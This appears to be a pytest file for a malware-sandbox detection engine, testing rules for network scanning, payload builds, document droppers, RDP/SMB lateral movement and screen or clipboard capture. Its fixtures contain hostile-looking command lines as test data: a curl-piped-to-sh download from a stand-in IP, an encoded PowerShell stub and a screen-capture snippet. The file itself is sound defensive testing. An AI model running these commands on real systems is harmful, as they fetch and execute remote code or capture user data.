"""Tests for rules 17–21 — the five detections that complete the 14/14 ATT&CK
Enterprise tactic coverage gate (Reconnaissance, Resource Development, Initial
Access, Lateral Movement, Collection). Each rule gets a positive case and an
FP gate.
"""

import datetime

from .conftest import make_run


def _ts(offset_seconds: int = 0) -> str:
    return (
        datetime.datetime(2026, 8, 1, 12, 0, 0, tzinfo=datetime.timezone.utc)
        + datetime.timedelta(seconds=offset_seconds)
    ).isoformat()


def _ingest(client, run_id: str, events: list[dict]) -> None:
    resp = client.post("/ingest/batch", json=events)
    assert resp.status_code == 202, resp.text


def _alerts(client, run_id: str) -> list[dict]:
    return client.get(f"/runs/{run_id}/alerts").json()


def _win_proc(run_id: str, pid: int, ppid: int, name: str, cmd: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "windows", "event_type": "process_create",
        "timestamp": _ts(ts), "pid": pid, "ppid": ppid, "process_name": name,
        "command_line": cmd,
    }


def _lin_proc(run_id: str, pid: int, ppid: int, name: str, cmd: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "linux", "event_type": "process_create",
        "timestamp": _ts(ts), "pid": pid, "ppid": ppid, "process_name": name,
        "command_line": cmd,
    }


def _conn(run_id: str, pid: int, ip: str, port: int, ts: int = 0, platform: str = "linux") -> dict:
    return {
        "run_id": run_id, "platform": platform, "event_type": "network_connection",
        "timestamp": _ts(ts), "pid": pid, "ppid": 1, "process_name": "curl",
        "command_line": "curl",
        "dest_ip": ip, "dest_port": port, "protocol": "tcp",
    }


# -- Rule 17 — network-scan (Reconnaissance, T1595) ---------------------------


def test_network_scan_fires_on_many_hosts_one_port(client):
    run_id = make_run(client, sample_name="scan.sh", platform="linux")
    _ingest(client, run_id, [
        _conn(run_id, 100, "198.51.100.11", 22, ts=1),
        _conn(run_id, 100, "198.51.100.12", 22, ts=2),
        _conn(run_id, 100, "198.51.100.13", 22, ts=3),
        _conn(run_id, 100, "198.51.100.14", 22, ts=4),
        _conn(run_id, 100, "198.51.100.15", 22, ts=5),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "network-scan"]
    assert len(fired) == 1  # one alert for the whole sweep, not per host
    assert fired[0]["severity"] == "suspicious"
    assert "5 distinct hosts" in fired[0]["details"]
    assert "port 22" in fired[0]["details"]


def test_network_scan_few_hosts_never_fires(client):
    run_id = make_run(client, sample_name="light.sh", platform="linux")
    _ingest(client, run_id, [
        _conn(run_id, 100, "198.51.100.11", 22, ts=1),
        _conn(run_id, 100, "198.51.100.12", 22, ts=2),
        _conn(run_id, 100, "198.51.100.13", 22, ts=3),
    ])
    assert all(a["rule_id"] != "network-scan" for a in _alerts(client, run_id))


def test_network_scan_browsing_ports_exempt(client):
    """Windows soak FP #1 — a pid fanning out across many distinct hosts on
    the web ports (443) is browsing, not scanning."""
    run_id = make_run(client, sample_name="browser.exe", platform="windows")
    for i in range(6):
        _ingest(client, run_id, [_conn(run_id, 4000, f"198.51.100.{i}", 443, ts=i, platform="windows")])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "network-scan"]
    assert fired == []


def test_network_scan_reputation_clean_fanout_exempt(client):
    """Every distinct target cached 'clean' → known-good infra fan-out, not a
    sweep — the exemption requires positive evidence, not absence of data.
    The cache is seeded through the app's own db_session (closed before the
    batch evaluates — the rule reads the cache at ingest time)."""
    from ..core.db import db_session
    from ..models.event import upsert_cache

    run_id = make_run(client, sample_name="apifan.exe")
    with db_session() as conn:
        for i in range(6):
            upsert_cache(conn, f"10.0.{i}.1", 0, 0, "clean")
    _ingest(client, run_id, [_conn(run_id, 4000, f"10.0.{i}.1", 8443, ts=i) for i in range(6)])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "network-scan"]
    assert fired == []


def test_network_scan_flagged_target_keeps_signal(client):
    """One cached-malicious target keeps the sweep — the exemption requires
    ALL targets clean (the uncached .1–.5 are not clean by absence)."""
    from ..core.db import db_session
    from ..models.event import upsert_cache

    run_id = make_run(client, sample_name="sweep.exe")
    with db_session() as conn:
        upsert_cache(conn, "203.0.113.0", 90, 12, "malicious")
    _ingest(client, run_id, [_conn(run_id, 4000, f"203.0.113.{i}", 22, ts=i) for i in range(6)])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "network-scan"]
    assert len(fired) == 1
    assert "port 22" in fired[0]["details"]


def test_network_scan_flags_every_scanning_pid(client):
    """Two pids sweeping at once → an alert per scanner (the old (None, None)
    dedup key collapsed every pid into the first alert of the run)."""
    run_id = make_run(client, sample_name="two-scanners.sh", platform="linux")
    events = []
    for pid, base in ((100, 21), (200, 31)):
        for i in range(5):
            events.append(_conn(run_id, pid, f"198.51.100.{base + i}", 22, ts=1 + i))
    _ingest(client, run_id, events)
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "network-scan"]
    assert len(fired) == 2
    assert {a["related_pid"] for a in fired} == {100, 200}


def test_network_scan_storm_cap_binds(client):
    """11 scanning pids → NETWORK_SCAN_MAX_ALERTS (10) fire, 1 held back —
    the storm cap is meaningful now that scans dedupe per pid."""
    run_id = make_run(client, sample_name="scan-flood.sh", platform="linux")
    events = []
    for pid in range(100, 111):
        for i in range(5):
            events.append(_conn(run_id, pid, f"198.51.100.{pid + i}", 22, ts=1 + i))
    _ingest(client, run_id, events)
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "network-scan"]
    assert len(fired) == 10
    assert client.get(f"/runs/{run_id}").json()["suppressed_alerts"] == {"network-scan": 1}


# -- Rule 18 — toolchain-build (Resource Development, T1587.001) -------------


def test_toolchain_build_into_tmp_fires(client):
    run_id = make_run(client, sample_name="build.sh", platform="linux")
    _ingest(client, run_id, [
        _lin_proc(run_id, 100, 1, "gcc", "gcc -o /tmp/payload /tmp/payload.c", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "toolchain-build"]
    assert len(fired) == 1
    assert "/tmp/payload" in fired[0]["details"]


def test_toolchain_build_into_install_path_never_fires(client):
    run_id = make_run(client, sample_name="legit-build.sh", platform="linux")
    _ingest(client, run_id, [
        _lin_proc(run_id, 100, 1, "gcc", "gcc -o /usr/local/bin/tool src/tool.c", ts=1),
        _lin_proc(run_id, 101, 1, "cc", "cc -o ./tool src/tool.c", ts=2),
    ])
    assert all(a["rule_id"] != "toolchain-build" for a in _alerts(client, run_id))


# -- Rule 19 — document-dropper (Initial Access, T1566.002) ------------------


def test_document_dropper_winword_to_powershell(client):
    run_id = make_run(client, sample_name="macro.docm")
    _ingest(client, run_id, [
        _win_proc(run_id, 210, 4, "winword.exe", r"C:\Program Files\Microsoft Office\WINWORD.EXE /q /n", ts=1),
        _win_proc(run_id, 211, 210, "powershell.exe", "powershell.exe -enc SQBFAFgA", ts=2),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "document-dropper"]
    assert len(fired) == 1
    assert fired[0]["severity"] == "malicious"
    assert "winword.exe spawned powershell.exe" in fired[0]["details"]
    # The same event also fires the Execution-tactic pair rule — both tactics
    # are genuinely present.
    assert any(a["rule_id"] == "suspicious-parent-child" for a in _alerts(client, run_id))


def test_document_dropper_linux_soffice_to_bash(client):
    run_id = make_run(client, sample_name="lure.odt", platform="linux")
    _ingest(client, run_id, [
        _lin_proc(run_id, 100, 1, "soffice", "soffice --calc /tmp/invoice.ods", ts=1),
        _lin_proc(run_id, 101, 100, "bash", "bash -c 'curl http://198.51.100.9/x | sh'", ts=2),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "document-dropper"]
    assert len(fired) == 1
    assert "soffice spawned bash" in fired[0]["details"]


def test_document_dropper_benign_child_never_fires(client):
    """A document viewer spawning its own helper (not a script host) is normal."""
    run_id = make_run(client, sample_name="normal.docm")
    _ingest(client, run_id, [
        _win_proc(run_id, 220, 4, "winword.exe", r"C:\Program Files\Microsoft Office\WINWORD.EXE /q /n", ts=1),
        _win_proc(run_id, 221, 220, "winscp.exe", r"C:\Program Files\WinSCP\winscp.exe", ts=2),
    ])
    assert all(a["rule_id"] != "document-dropper" for a in _alerts(client, run_id))


# -- Rule 20 — lateral-rdp-smb (Lateral Movement, T1021.001) ------------------


def test_lateral_rdp_outbound_fires(client):
    run_id = make_run(client, sample_name="pivot.sh", platform="linux")
    _ingest(client, run_id, [
        _conn(run_id, 100, "192.168.1.50", 3389, ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lateral-rdp-smb"]
    assert len(fired) == 1
    assert "192.168.1.50:3389" in fired[0]["details"]


def test_lateral_smb_outbound_fires(client):
    run_id = make_run(client, sample_name="pivot2.sh", platform="windows")
    _ingest(client, run_id, [
        _conn(run_id, 100, "192.168.1.60", 445, ts=1, platform="windows"),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lateral-rdp-smb"]
    assert len(fired) == 1
    assert ":445" in fired[0]["details"]


def test_lateral_loopback_rdp_never_fires(client):
    """RDP to localhost is a local VM/remote-desktop session, not movement."""
    run_id = make_run(client, sample_name="local-vm.sh", platform="linux")
    _ingest(client, run_id, [
        _conn(run_id, 100, "127.0.0.1", 3389, ts=1),
    ])
    assert all(a["rule_id"] != "lateral-rdp-smb" for a in _alerts(client, run_id))


def test_lateral_https_port_never_fires(client):
    run_id = make_run(client, sample_name="web.sh", platform="linux")
    _ingest(client, run_id, [
        _conn(run_id, 100, "203.0.113.88", 443, ts=1),
    ])
    assert all(a["rule_id"] != "lateral-rdp-smb" for a in _alerts(client, run_id))


# -- Rule 21 — screen-capture (Collection, T1113) -----------------------------


def test_screen_capture_windows_copyfromscreen(client):
    run_id = make_run(client, sample_name="snipe.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 300, 4, "powershell.exe",
                  "powershell.exe -c Add-Type -A System.Drawing; [System.Windows.Forms.Screen]::PrimaryScreen; CopyFromScreen", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "screen-capture"]
    assert len(fired) == 1
    assert "CopyFromScreen" in fired[0]["details"]


def test_screen_capture_linux_scrot_process(client):
    run_id = make_run(client, sample_name="grab.sh", platform="linux")
    _ingest(client, run_id, [
        _lin_proc(run_id, 100, 1, "scrot", "scrot /tmp/screen.png", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "screen-capture"]
    assert len(fired) == 1
    assert "scrot" in fired[0]["details"]


def test_screen_capture_linux_python_import_never_fires(client):
    """The word 'import' in a python command line is normal — only capture-tool
    *process names* and unambiguous clipboard/x11grab patterns match."""
    run_id = make_run(client, sample_name="pyscript.sh", platform="linux")
    _ingest(client, run_id, [
        _lin_proc(run_id, 100, 1, "python3", "python3 -c \"import os, sys; print(os.getcwd())\"", ts=1),
    ])
    assert all(a["rule_id"] != "screen-capture" for a in _alerts(client, run_id))


def test_screen_capture_clipboard_xclip(client):
    run_id = make_run(client, sample_name="clip.sh", platform="linux")
    _ingest(client, run_id, [
        _lin_proc(run_id, 100, 1, "bash", "xclip -o -selection clipboard", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "screen-capture"]
    assert len(fired) == 1
    assert "clipboard read" in fired[0]["details"]
